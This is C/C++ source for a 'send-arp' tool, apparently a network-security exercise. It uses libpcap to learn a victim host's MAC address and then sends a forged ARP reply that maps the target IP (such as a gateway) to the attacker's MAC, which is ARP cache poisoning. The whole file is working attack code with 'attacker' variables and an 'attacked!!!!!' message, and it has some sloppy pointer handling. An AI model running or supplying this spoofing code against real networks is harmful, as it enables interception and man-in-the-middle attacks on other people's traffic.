#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"

#define ETHER_SIZE 14

#pragma pack(push, 1)
struct eapacket
{
    EthHdr eth;
    ArpHdr arp;
};
#pragma pack(pop)

int get_myinfo(const char *if_name, struct ifreq ifr, uint8_t *attacker_mac, char *attacker_ip);
int get_sendermac(pcap_t *sock_handle, struct pcap_pkthdr *header, const u_char *packet, const struct EthHdr *ethernet, const struct ArpHdr *arp, uint8_t *sender_mac, uint8_t *attacker_mac);
int res;

void usage()
{
    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
    printf("sample : send-arp wlan0 192.168.0.2 192.168.0.1\n");
}

int main(int argc, char *argv[])
{
    if(argc != 4)
    {
        usage();
        return -1;
    }
    

    struct pcap_pkthdr *header;
    const u_char *packet;

    const struct EthHdr *ether;
    const struct ArpHdr *arp;

    uint8_t *attackermac = (uint8_t*)malloc(sizeof(char) * 6);
    char *attackerip = (char*)malloc(sizeof(char) * 20);
    uint8_t *sendermac = (uint8_t*)malloc(sizeof(char) * 20);
    const char *sender_ip = argv[2];
    const char *target_ip = argv[3];
    
    struct ifreq ifr;
    pcap_t *handle;
    char ebuf[PCAP_ERRBUF_SIZE];

    if((handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, ebuf)) == NULL)
    {
        fprintf(stderr, "%s can't open", argv[1]);
        return -1;
    }

    if(get_myinfo(argv[1], ifr, attackermac, attackerip) != 0)
    {
        puts("get_myinfo() error!\n");
        pcap_close(handle);
        return 0;
    }
    puts("ready....\n");

    eapacket eapacket;

    eapacket.eth.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    eapacket.eth.smac_ = attackermac;
    eapacket.eth.type_ = htons(EthHdr::Arp);

    eapacket.arp.hrd_ = htons(ArpHdr::ETHER);
    eapacket.arp.pro_ = htons(EthHdr::Ip4);
    eapacket.arp.hln_ = Mac::SIZE;
    eapacket.arp.pln_ = Ip::SIZE;
    eapacket.arp.op_ = htons(ArpHdr::Request);
    eapacket.arp.smac_ = attackermac;
    eapacket.arp.sip_ = htonl(Ip(attackerip));
    eapacket.arp.tmac_ = Mac("00:00:00:00:00:00");
    eapacket.arp.tip_ = htonl(Ip(sender_ip));

    if((res = pcap_sendpacket(handle, (const u_char*)&eapacket, sizeof(eapacket))) != 0)
    {
        puts("sendpacket() error!\n");
        pcap_close(handle);
        return 0;
    }

    puts("Finding out about the other host....\n");

    if((res = get_sendermac(handle, header, packet, (const EthHdr*)&ether, (const ArpHdr *)&arp, sendermac, attackermac)) != 0)
    {
        puts("get_sendemac() error!\n");
        pcap_close(handle);
        return 0;
    }
    
    eapacket.eth.dmac_ = sendermac;
    eapacket.eth.smac_ = attackermac;
    eapacket.eth.type_ = htons(EthHdr::Arp);

    eapacket.arp.hrd_ = htons(ArpHdr::ETHER);
    eapacket.arp.pro_ = htons(EthHdr::Ip4);
    eapacket.arp.hln_ = Mac::SIZE;
    eapacket.arp.pln_ = Ip::SIZE;
    eapacket.arp.op_ = htons(ArpHdr::Reply);
    eapacket.arp.smac_ = attackermac;
    eapacket.arp.sip_ = htonl(Ip(target_ip));
    eapacket.arp.tmac_ = sendermac;
    eapacket.arp.tip_ = htonl(Ip(sender_ip));
   
    if((res = pcap_sendpacket(handle, (const u_char*)&eapacket, sizeof(eapacket))) != 0)
    {
        puts("can't attack\n");
        pcap_close(handle);
        return 0;
    }
    else puts("attacked!!!!!\n");
    
    pcap_close(handle);
    return 0;
}

int get_myinfo(const char *if_name, struct ifreq ifr, uint8_t *attacker_mac, char *attacker_ip)
{
    int sock;
    struct sockaddr_in *addr;
    strcpy(ifr.ifr_name, if_name);

    if((sock = socket(PF_INET, SOCK_DGRAM, 0)) < 0)
    {
        puts("socket error");
        return 0;
    }
    
    if(ioctl(sock, SIOCGIFHWADDR, &ifr) != 0)
    {
        puts("can't get hardware address");
        close(sock);
        return 0;
    }
    else
        memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);
    
   if(ioctl(sock, SIOCGIFADDR, &ifr) != 0)
   {
       puts("can't get ip address");
       close(sock);
       return 0;
   }

    addr = (struct sockaddr_in*)&ifr.ifr_addr;
    strcpy(attacker_ip, inet_ntoa(addr->sin_addr));
   
   close(sock);
   return 0;
}

int get_sendermac(pcap_t *sock_handle, struct pcap_pkthdr *header, const u_char *packet, const struct EthHdr *ethernet, const struct ArpHdr *arp, uint8_t *sender_mac, uint8_t *attacker_mac)
{
    while(1)
    {
        res = pcap_next_ex(sock_handle, &header, &packet);
        if(res == 0) continue;
        if(res == -1 || res == -2)
        {
            puts("pcap_next_ex() ERROR or BOF\n");
            break;
        }

        ethernet = (struct EthHdr*)(packet);
        arp = (struct ArpHdr*)(packet + ETHER_SIZE);
        if(ntohs(ethernet->type_) == EthHdr::Arp && ntohs(arp->op_) == ArpHdr::Reply)
        {
            if(Mac(ethernet->dmac_) == Mac(attacker_mac))
            {
                memcpy(sender_mac, Mac(ethernet->smac_), 6);
                break;
            }
        }
    }

    return 0;
}
